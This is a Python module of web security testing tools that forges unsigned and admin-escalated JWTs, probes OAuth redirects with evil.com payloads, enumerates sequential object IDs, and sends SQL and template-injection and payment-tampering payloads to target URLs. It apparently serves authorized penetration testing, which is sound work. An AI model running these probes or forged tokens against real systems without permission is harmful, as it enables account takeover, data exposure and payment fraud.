"""
BlackBox Auth - Authentication & Authorization Testing
=======================================================

Tools for testing authentication and authorization:
- jwt_analyze: JWT token security analysis
- oauth_scan: OAuth implementation vulnerabilities
- idor_scan: Insecure Direct Object Reference
- auth_flow_attack: Authentication flow weaknesses
- db_error_exploit: Database error information disclosure
- payment_security_test: Payment flow security
"""

import json
import base64
import hmac
import hashlib
import urllib.request
import urllib.parse
from typing import Optional, List, Dict, Any


def jwt_analyze(
    token: str,
    test_none_alg: bool = True,
    test_alg_confusion: bool = True,
    test_claim_manipulation: bool = True,
    public_key: Optional[str] = None,
    brute_force_secret: bool = False
) -> Dict[str, Any]:
    """
    Analyze JWT token for security vulnerabilities.

    Args:
        token: JWT token to analyze
        test_none_alg: Test 'none' algorithm bypass
        test_alg_confusion: Test RS256 to HS256 confusion
        test_claim_manipulation: Test claim value changes
        public_key: Public key for algorithm confusion
        brute_force_secret: Attempt weak secret brute force
    """
    findings = []

    try:
        parts = token.split('.')
        if len(parts) != 3:
            return {"error": "Invalid JWT format"}

        # Decode header and payload
        header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))

        algorithm = header.get('alg', 'unknown')

        # Check for weak algorithms
        if algorithm.lower() == 'none':
            findings.append({"type": "none_algorithm", "severity": "CRITICAL", "note": "No signature verification"})
        elif algorithm in ['HS256', 'HS384', 'HS512']:
            findings.append({"type": "symmetric_algorithm", "severity": "INFO", "note": "Uses shared secret"})

        # Check for sensitive claims
        sensitive_claims = ['admin', 'role', 'is_admin', 'permissions', 'scope']
        for claim in sensitive_claims:
            if claim in payload:
                findings.append({
                    "type": "sensitive_claim",
                    "claim": claim,
                    "value": payload[claim],
                    "severity": "MEDIUM",
                    "note": "Could be manipulated"
                })

        # Check expiration
        if 'exp' not in payload:
            findings.append({"type": "no_expiration", "severity": "MEDIUM", "note": "Token never expires"})

        # Generate attack tokens
        attack_tokens = {}

        # None algorithm attack
        if test_none_alg:
            none_header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip('=')
            attack_tokens["none_alg"] = f"{none_header}.{parts[1]}."

        # Claim manipulation
        if test_claim_manipulation:
            modified_payload = payload.copy()
            if 'admin' in modified_payload:
                modified_payload['admin'] = True
            if 'role' in modified_payload:
                modified_payload['role'] = 'admin'
            mod_payload = base64.urlsafe_b64encode(json.dumps(modified_payload).encode()).decode().rstrip('=')
            attack_tokens["modified_claims"] = f"{parts[0]}.{mod_payload}.{parts[2]}"

        return {
            "header": header,
            "payload": payload,
            "algorithm": algorithm,
            "findings": findings,
            "attack_tokens": attack_tokens,
            "vulnerable": len([f for f in findings if f["severity"] in ["CRITICAL", "HIGH"]]) > 0
        }

    except Exception as e:
        return {"error": str(e)}


def oauth_scan(
    auth_url: str,
    redirect_uri: Optional[str] = None,
    client_id: str = "test_client",
    categories: Optional[List[str]] = None,
    headers: Optional[Dict] = None
) -> Dict[str, Any]:
    """
    Scan OAuth implementation for vulnerabilities.

    Args:
        auth_url: OAuth authorization URL
        redirect_uri: Redirect URI to test
        client_id: Client ID
        categories: Vulnerability categories to test
        headers: Custom headers
    """
    if categories is None:
        categories = ["open_redirect", "state_missing", "token_leakage"]

    findings = []

    # Test redirect_uri manipulation
    if "open_redirect" in categories and redirect_uri:
        evil_redirects = [
            f"{redirect_uri}@evil.com",
            f"{redirect_uri}/../../../evil.com",
            "https://evil.com",
            f"{redirect_uri}%00@evil.com",
        ]

        for evil in evil_redirects:
            test_url = f"{auth_url}?client_id={client_id}&redirect_uri={urllib.parse.quote(evil)}&response_type=code"
            try:
                req = urllib.request.Request(test_url, headers=headers or {})
                with urllib.request.urlopen(req, timeout=10) as response:
                    if "evil.com" in response.url or response.status == 302:
                        findings.append({
                            "type": "open_redirect",
                            "payload": evil,
                            "severity": "HIGH"
                        })
            except urllib.error.HTTPError as e:
                if e.code != 400:  # 400 = properly rejected
                    findings.append({"type": "open_redirect_possible", "payload": evil, "severity": "MEDIUM"})
            except:
                continue

    # Check for state parameter
    if "state_missing" in categories:
        test_url = f"{auth_url}?client_id={client_id}&response_type=code"
        if redirect_uri:
            test_url += f"&redirect_uri={urllib.parse.quote(redirect_uri)}"

        try:
            req = urllib.request.Request(test_url, headers=headers or {})
            with urllib.request.urlopen(req, timeout=10) as response:
                if "state" not in response.url:
                    findings.append({
                        "type": "state_not_enforced",
                        "severity": "MEDIUM",
                        "note": "CSRF protection may be missing"
                    })
        except:
            pass

    return {
        "auth_url": auth_url,
        "findings": findings,
        "categories_tested": categories,
        "vulnerable": len(findings) > 0
    }


def idor_scan(
    url: str,
    param: Optional[str] = None,
    base_value: Optional[str] = None,
    range_start: int = 1,
    range_end: int = 100,
    headers: Optional[Dict] = None
) -> Dict[str, Any]:
    """
    Test for Insecure Direct Object Reference.

    Args:
        url: Target URL with ID parameter
        param: Parameter containing object reference
        base_value: Known valid ID
        range_start: Start of sequential range
        range_end: End of sequential range
        headers: Custom headers
    """
    findings = []
    accessible = []

    # Test sequential IDs
    for i in range(range_start, min(range_end, range_start + 20)):
        if param:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            params[param] = [str(i)]
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(params, doseq=True)}"
        else:
            test_url = url.replace(str(base_value or "1"), str(i))

        try:
            req = urllib.request.Request(test_url, headers=headers or {"User-Agent": "BlackBox"})
            with urllib.request.urlopen(req, timeout=5) as response:
                if response.status == 200:
                    accessible.append({"id": i, "status": 200})
        except urllib.error.HTTPError as e:
            if e.code == 200:
                accessible.append({"id": i, "status": 200})
        except:
            continue

    if len(accessible) > 5:
        findings.append({
            "type": "sequential_ids_accessible",
            "count": len(accessible),
            "severity": "HIGH",
            "note": "Multiple IDs accessible - check authorization"
        })

    return {
        "url": url,
        "ids_tested": min(range_end - range_start, 20),
        "accessible": accessible[:10],
        "findings": findings,
        "vulnerable": len(findings) > 0
    }


def auth_flow_attack(
    url: str,
    attack_type: str = "all",
    email: Optional[str] = None,
    target_domain: Optional[str] = None,
    headers: Optional[Dict] = None
) -> Dict[str, Any]:
    """
    Test authentication flow weaknesses.

    Args:
        url: Auth endpoint (registration/login)
        attack_type: Type of attack (domain_bypass, mass_assignment, duplicate_reg)
        email: Test email address
        target_domain: Target domain for bypass testing
    """
    findings = []

    if attack_type in ["domain_bypass", "all"] and target_domain and email:
        bypass_emails = [
            f"test@{target_domain}",
            f"test@subdomain.{target_domain}",
            f"test%00@evil.com@{target_domain}",
            f"test@{target_domain}.evil.com",
        ]

        for bypass_email in bypass_emails:
            findings.append({
                "type": "domain_bypass_test",
                "payload": bypass_email,
                "severity": "INFO",
                "note": "Test manually"
            })

    if attack_type in ["mass_assignment", "all"]:
        dangerous_params = ["role", "admin", "is_admin", "permissions", "user_type"]
        findings.append({
            "type": "mass_assignment_test",
            "params_to_try": dangerous_params,
            "severity": "INFO",
            "note": "Add these params to registration request"
        })

    return {
        "url": url,
        "attack_type": attack_type,
        "findings": findings,
        "test_manually": True
    }


def db_error_exploit(
    url: str,
    param: Optional[str] = None,
    db_type: str = "auto",
    headers: Optional[Dict] = None
) -> Dict[str, Any]:
    """
    Extract database info via error messages.

    Args:
        url: Target endpoint
        param: Parameter to inject
        db_type: Database type (auto, postgres, mysql, etc.)
    """
    findings = []

    error_payloads = [
        ("'", ["syntax error", "SQL", "mysql", "postgresql", "ORA-", "sqlite"]),
        ("1'--", ["syntax error", "SQL"]),
        ("1 AND 1=1", []),
        ("{{7*7}}", ["49", "template"]),
        ("${7*7}", ["49"]),
    ]

    parsed = urllib.parse.urlparse(url)
    base_params = urllib.parse.parse_qs(parsed.query)

    for payload, indicators in error_payloads:
        if param:
            test_params = base_params.copy()
            test_params[param] = [payload]
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
        else:
            test_url = url

        try:
            req = urllib.request.Request(test_url, headers=headers or {})
            with urllib.request.urlopen(req, timeout=10) as response:
                body = response.read().decode('utf-8', errors='ignore')

                for indicator in indicators:
                    if indicator.lower() in body.lower():
                        findings.append({
                            "type": "error_disclosure",
                            "payload": payload,
                            "indicator": indicator,
                            "severity": "MEDIUM",
                            "evidence": body[:200]
                        })
                        break
        except urllib.error.HTTPError as e:
            body = e.read().decode('utf-8', errors='ignore') if e.fp else ""
            for indicator in indicators:
                if indicator.lower() in body.lower():
                    findings.append({
                        "type": "error_disclosure",
                        "payload": payload,
                        "indicator": indicator,
                        "severity": "MEDIUM"
                    })
                    break
        except:
            continue

    return {"url": url, "findings": findings, "vulnerable": len(findings) > 0}


def payment_security_test(
    url: str,
    categories: Optional[List[str]] = None,
    sample_payload: Optional[Dict] = None,
    headers: Optional[Dict] = None
) -> Dict[str, Any]:
    """
    Test payment endpoint security.

    Args:
        url: Payment endpoint URL
        categories: Test categories
        sample_payload: Sample valid payment payload
        headers: Custom headers
    """
    if categories is None:
        categories = ["negative_value", "currency_confusion", "quantity_manipulation"]

    findings = []

    test_payloads = {
        "negative_value": {"amount": -100, "note": "Try negative amounts"},
        "zero_amount": {"amount": 0, "note": "Try zero amount"},
        "currency_confusion": {"currency": "XXX", "note": "Try invalid currency"},
        "quantity_manipulation": {"quantity": 0, "note": "Try zero quantity"},
        "price_override": {"price": 0.01, "note": "Try overriding price"},
    }

    for category in categories:
        if category in test_payloads:
            findings.append({
                "type": category,
                "test_payload": test_payloads[category],
                "severity": "INFO",
                "note": "Test manually with modified request"
            })

    return {
        "url": url,
        "categories_tested": categories,
        "findings": findings,
        "recommendation": "Test each payload manually and observe behavior"
    }


__all__ = [
    "jwt_analyze",
    "oauth_scan",
    "idor_scan",
    "auth_flow_attack",
    "db_error_exploit",
    "payment_security_test"
]
